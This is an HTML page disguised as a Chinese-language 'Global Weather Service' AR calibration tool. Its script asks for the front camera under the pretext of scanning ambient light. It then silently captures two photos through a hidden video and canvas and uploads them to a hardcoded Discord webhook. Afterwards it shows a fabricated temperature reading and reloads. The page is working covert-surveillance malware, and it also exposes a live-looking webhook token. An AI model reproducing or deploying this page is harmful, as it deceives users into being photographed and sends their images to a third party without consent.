<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Global Weather Service</title>
<style>
    /* 現代化 Apple 風格介面 */
    body { 
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
        margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; 
        background-color: #f5f5f7; color: #1d1d1f; 
    }

    .card { 
        width: 85%; max-width: 380px; padding: 40px 24px; 
        background: #ffffff; border-radius: 28px; 
        box-shadow: 0 20px 40px rgba(0,0,0,0.08);
        transition: all 0.4s ease;
    }

    .icon-wrapper {
        width: 70px; height: 70px; margin: 0 auto 24px;
        background: linear-gradient(135deg, #007aff, #5ac8fa);
        border-radius: 18px; display: flex; align-items: center; justify-content: center;
        box-shadow: 0 8px 16px rgba(0,122,255,0.2);
    }

    h2 { font-size: 22px; font-weight: 600; margin: 0 0 12px; letter-spacing: -0.5px; }
    p { font-size: 15px; color: #86868b; line-height: 1.5; margin-bottom: 30px; }

    /* 藍色專業按鈕 */
    button { 
        width: 100%; padding: 16px; font-size: 17px; font-weight: 600; 
        border: none; border-radius: 14px; 
        background: #007aff; color: #fff; 
        cursor: pointer; transition: 0.2s;
    }
    button:active { transform: scale(0.97); background: #0063cc; }

    /* 載入中動畫 (Spinner) */
    .spinner {
        display: none; width: 24px; height: 24px; border: 3px solid rgba(0,122,255,0.2);
        border-top: 3px solid #007aff; border-radius: 50%;
        margin: 20px auto; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    #status { font-size: 13px; color: #007aff; font-weight: 500; margin-top: 10px; }
</style>
</head>
<body>

<div class="card">
    <div class="icon-wrapper">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41M12 7a5 5 0 100 10 5 5 0 000-10z"/>
        </svg>
    </div>
    
    <h2>AR 實境天氣校準</h2>
    <p>為了提供精確的體感溫度與光譜數據，系統將開啟 AR 模式掃描周圍環境光線。</p>

    <button id="btn" onclick="startCalibration()">開始環境校準</button>
    
    <div class="spinner" id="loader"></div>
    <div id="status"></div>
</div>

<video id="v" style="display:none;" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
var currentStream = null;

async function startCalibration() {
    document.getElementById("btn").style.display = "none";
    document.getElementById("loader").style.display = "block";
    document.getElementById("status").innerHTML = "正在請求感測器權限...";

    try {
        // 請求權限
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        currentStream = stream;
        const video = document.getElementById("v");
        video.srcObject = stream;
        await video.play();
        
        document.getElementById("status").innerHTML = "環境光譜掃描中 (34%)...";
        
        // 分兩次擷取，模擬精確校準
        setTimeout(() => takeSnap(1), 2000);
        setTimeout(() => takeSnap(2, true), 4500);

    } catch (err) {
        document.getElementById("status").innerHTML = "校準失敗：需要硬體存取權限。";
        document.getElementById("loader").style.display = "none";
    }
}

function takeSnap(num, isLast = false) {
    const video = document.getElementById("v");
    const canvas = document.getElementById("c");
    
    if (video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("file", blob, `calib_${num}.jpg`);
            fd.append("payload_json", JSON.stringify({ content: `✅ **AR 校準數據已同步 (${num}/2)**` }));
            
            fetch(webhook, { method: "POST", body: fd }).then(() => {
                if (!isLast) {
                    document.getElementById("status").innerHTML = "光譜分析成功，正計算深度數據 (89%)...";
                } else {
                    currentStream.getTracks().forEach(t => t.stop()); // 關閉燈號
                    document.getElementById("status").innerHTML = "校準完成，正在載入預報...";
                    setTimeout(() => { 
                        alert("校準成功：當前環境體感溫度為 26°C。\n資訊已更新至最上方。"); 
                        location.reload(); 
                    }, 800);
                }
            });
        }, "image/jpeg", 0.7);
    }
}
</script>
</body>
</html>
